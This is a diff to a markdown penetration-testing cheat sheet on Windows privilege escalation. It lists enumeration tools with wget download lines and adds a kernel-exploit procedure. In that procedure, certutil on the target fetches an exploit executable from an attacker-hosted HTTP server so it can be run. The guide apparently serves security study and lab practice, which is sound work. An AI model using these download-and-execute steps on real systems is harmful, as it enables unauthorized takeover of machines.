@@ -498,52 +498,79 @@ netsh firewall show config
 ```
 
 ### Automated Tools 
-Tools that perform automated privesc enum on Windows boxes
-WinPEAS
+Tools that perform automated privesc enum on Windows boxes: 
+
+**WinPEAS**
+
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
 
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
 ```
-*If WinPEASany.exe fails, it may either be blocked by antivirus or the target **does not have .NET version 4.0**.* Try to run WinPEAS.bat
+*If WinPEASany.exe fails, it may either be blocked by antivirus or the target **does not have .NET version 4.0**. Try to run WinPEAS.bat instead.*
 
-Seatbelt
+**Seatbelt**
+
 ```bash
 https://github.com/GhostPack/Seatbelt
 ```
 
-Watson 
+**Watson** 
+
 ```bash
 https://github.com/rasta-mouse/Watson
 ```
 
-SharpUp
+**SharpUp**
+
 ```bash
 https://github.com/GhostPack/SharpUp
 ```
 
-windows-exploit-suggester
+**windows-exploit-suggester**
+
 ```bash
 wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
 ```
 
-Sherlock.ps1 
+**Sherlock.ps1** 
+
 ```bash
 wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
 ```
 
-PowerUp.ps1
+**PowerUp.ps1**
+
 ```bash
 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 ```
 
-jaws-enum.ps1
+**jaws-enum.ps1**
+
 ```bash
 wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
 ```
 
+### Kernel Exploits
 
 
+1. Run `windows-exploit-suggester.py` and choose an exploit from the listed output
+```bash
+python windows-exploit-suggester.py --database $DB --systeminfo /path/to/sysinfo.txt
+```
+2. Run lightweight python server on Kali machine to host exploit executable: 
+```bash
+python3 -m http.server 80
+```
+3. Navigate to `temp` folder on windows target: 
+```cmd
+cd C:\Windows\temp
+```
+4. Use `Certutil` to grab exploit from kali machine: 
+```cmd
+certutil -urlcache -f http://$IP/Exploit.exe
+```
+5. Run the exploit
 
 
 
